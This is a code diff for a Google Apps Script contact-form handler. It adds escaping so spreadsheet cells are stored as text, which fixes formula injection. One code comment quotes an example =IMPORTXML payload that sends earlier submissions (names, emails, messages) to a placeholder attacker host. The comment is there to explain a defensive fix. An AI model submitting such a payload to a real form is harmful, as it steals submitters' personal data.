@@ -90,9 +90,10 @@ function doPost(e) {
     // 8. Dedupe: skip identical email+message inside the window.
     if (_isDuplicate(email, message)) return _drop('duplicate');
 
-    // Passed all checks -> store.
+    // Passed all checks -> store. Values are escaped so Sheets stores them as
+    // text, never as live formulas (see _sheetSafe).
     var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-    sheet.appendRow([new Date(), name, email, message]);
+    sheet.appendRow([new Date(), _sheetSafe(name), _sheetSafe(email), _sheetSafe(message)]);
 
     return _json({ result: 'success' });
   } catch (err) {
@@ -105,6 +106,23 @@ function doPost(e) {
 // Collapse all whitespace (incl. newlines/tabs used for injection) to single spaces, then trim.
 function _clean(v) {
   return String(v || '').replace(/\s+/g, ' ').trim();
+}
+
+// Neutralises spreadsheet formula injection.
+//
+// appendRow() writes strings through the same parser as typed input, so a
+// submission beginning with = + - @ (or a tab/CR that Sheets strips before
+// parsing) is stored as a LIVE FORMULA, not text. A message of
+//   =IMPORTXML("https://attacker.tld/?d="&CONCATENATE(C1:D50),"//a")
+// would then run when the sheet is opened and POST earlier submissions
+// (names, emails, messages) to the attacker. The same payload is also a CSV
+// injection vector for anyone who exports the sheet and opens it in Excel.
+//
+// Prefixing with an apostrophe forces Sheets to treat the value as text; the
+// apostrophe is a display-only marker and is not part of the stored string.
+function _sheetSafe(v) {
+  var s = String(v || '');
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
 }
 
 // Bad data is logged but returns "success" so bots get no useful signal.
